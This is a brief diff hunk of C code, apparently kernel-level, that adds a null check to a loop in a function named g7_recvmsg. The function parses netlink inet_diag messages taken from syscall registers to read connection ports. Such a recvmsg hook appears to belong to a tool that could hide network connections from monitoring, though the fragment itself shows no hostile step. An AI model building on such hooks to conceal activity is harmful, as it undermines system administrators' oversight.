@@ -177,7 +177,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
         (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base,
         sizeof(struct nlmsghdr));
 
-    while (NLMSG_OK(nh, len)) {
+    while (nh && NLMSG_OK(nh, len)) {
         int src = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_sport);
         int dst = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_dport);
 
